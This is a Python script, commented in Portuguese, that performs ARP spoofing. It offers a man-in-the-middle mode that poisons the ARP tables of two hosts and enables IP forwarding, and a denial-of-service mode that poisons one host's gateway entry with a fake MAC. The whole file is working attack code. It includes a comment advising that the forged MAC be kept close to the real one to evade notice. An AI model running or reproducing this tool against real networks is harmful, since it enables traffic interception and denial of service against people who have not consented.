#!/usr/bin/env python

# Autor: Pedro Otávio
# Email: pedr_ofs@hotmail.com
# Atualizado: 01/03/2022

# Este script tem por finalidade realizar o ataques ARP Spoofing em uma rede.

# Este script possui a capacidade de executar ataques "Man in the Middle" através do envenanamento da
# tabela ARP de um determinado host da rede. Possui também a função "DOS". Podendo ser utilizada para
# realiza ataque de negação de serviço em um único host da rede.

# As bibliotecas "Scapy" e "Getmac" serão necessárias para a correta execução deste script. Sendo assim,
# as instalem.

import time
import sys
import os
from getmac import get_mac_address
from scapy.all import Ether,ARP,sendp

# Verifica se o usuário entrou com o número de argumentos corretamente.
if len(sys.argv) <= 2:

	# Informa ao usuário o modo de uso do script.
	print ("Modo de uso MITM:", sys.argv[0],"ip-alvo0 ip-alvo1")
	print ("Modo de uso DoS:", sys.argv[0], "dos ip-alvo0 ip-gateway")

# Verifica se o usuário deseja efetuar o ataque de negação de serviço (DoS).
elif sys.argv[1] == "dos":

	# Verifica se o usuário entrou com o número de argumentos corretamente.
	if len(sys.argv) <=3:
		print ("Modo de uso DoS:", sys.argv[0], "dos ip-alvo ip-gateway")

	else:
		# Utiliza a função get_mac_address para incluir o MAC do alvo na variável alvo_mac.
		alvo0_mac = get_mac_address(ip=sys.argv[2])

		# Verifica se a função coletou do endereço MAC do alvo.
		while alvo0_mac == "00:00:00:00:00:00":
			alvo0_mac = get_mac_address(ip=sys.argv[2])

		# Utiliza a função get_mac_address para incluir o MAC do gateway na veriável gateway_mac.
		gateway_mac = get_mac_address(ip=sys.argv[3])

		# Verifica se a função coletou do endereço MAC do gateway.
		while gateway_mac == "00:00:00:00:00:00":
			gateway_mac = get_mac_address(ip=sys.argv[3])

		print ("MAC do alvo0:", alvo0_mac)
		print ("MAC do gateway:", gateway_mac)
		print ("\nD0S 4TT4CK!\n£NV3NEN4ND0\n")

		# Cria um pacote ARP com o endereço incorreto MAC do gateway.
		pkt=Ether(dst=alvo0_mac , src=gateway_mac)/ARP(op=2 , hwsrc="aa:bb:cc:dd:ee:ff", hwdst=alvo0_mac , psrc=sys.argv[3] , pdst=sys.argv[2])

		#############################################################
		# DICA: O campo "hwsrc" carrega o endereço MAC falsificado. #
		# Afim de camuflar melhor o ataque, mantenha o endereço MAC #
		# falsificado o mais parecido com o endereço original do    #
		# gateway. ;)						    #
		#							    #
		#		     Original	          falso   	    #
		# Exemplo:	7c:b2:65:0e:c3:11   7c:b2:65:e0:c3:11	    #
		#############################################################

		# Envia os pacotes.
		sendp(pkt, inter=0.2, loop=1)

else:
	# Habilita o redirecionamento de pacotes.
	os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")

	# Utiliza a função get_mac_address para incluir o endereço MAC do atacante na variável atacante_mac.
	atacante_mac = get_mac_address()

	# Realiza a verificação do endereço MAC do atacante.
	while atacante_mac == "00:00:00:00:00:00":
		atacante_mac = get_mac_address()

	# Utiliza a função get_mac_address para incluir o MAC do alvo1 na variável alvo_mac.
	alvo0_mac = get_mac_address(ip=sys.argv[1])

	# Realiza a verificação do endereço MAC do alvo1.
	while alvo0_mac == "00:00:00:00:00:00":
		alvo0_mac = get_mac_address(ip=sys.argv[1])

	# Utiliza a função get_mac_address para incluir o MAC do alvo2 na veriável gateway_mac.
	alvo1_mac = get_mac_address(ip=sys.argv[2])

	# Realiza a verificaçao do endereço MAC do alvo2.
	while alvo1_mac == "00:00:00:00:00:00":
		alvo1_mac = get_mac_address(ip=sys.argv[2])

	print ("\nMAC do alvo0:", alvo0_mac)
	print ("MAC do alvo1:", alvo1_mac)
	print ("\nM1TM 4TT4CK!\n£NV3NEN4ND0\n")

	# Cria o pacote ARP Poisoning.
	pkt=Ether(dst=alvo0_mac , src=alvo1_mac)/ARP(op=2 , hwsrc=atacante_mac, hwdst=alvo0_mac , psrc=sys.argv[2] , pdst=sys.argv[1])
	pkt1=Ether(dst=alvo1_mac , src=alvo0_mac)/ARP(op=2 , hwsrc=alvo0_mac, hwdst=atacante_mac , psrc=sys.argv[1] , pdst=sys.argv[2])

	# Tenta realizar uma tarefa.
	try:
		# Inicialização da variável de contagem para ilustração dos pacotes enviados.
		i = 0
		while True:

			# Ilustração dos pacotes enviados.
			if (i % 2) == 0:

				# Envia o pacote envenenado para o alvo 0.
				sendp(pkt, verbose=0)

				# Ilustra o pacote 0.
				print("0", end="", flush=True)

				# Aguarda 0.1 segundo.
				time.sleep(0.1)

			else:
				# Envia o pacote envenenado para o alvo 1.
				sendp(pkt1, verbose=0)

				# Ilustra o pacote 1.
				print("1", end="", flush=True)

				# Aguarda 0.1 segundo.
				time.sleep(0.1)

			# Incrementa a variável de contagem para a ilustração.
			i += 1

	# Exceto interrupção do teclado.
	except KeyboardInterrupt:

		# Desabilita o redirecionamento de pacotes.
		os.system("echo '0' > /proc/sys/net/ipv4/ip_forward")
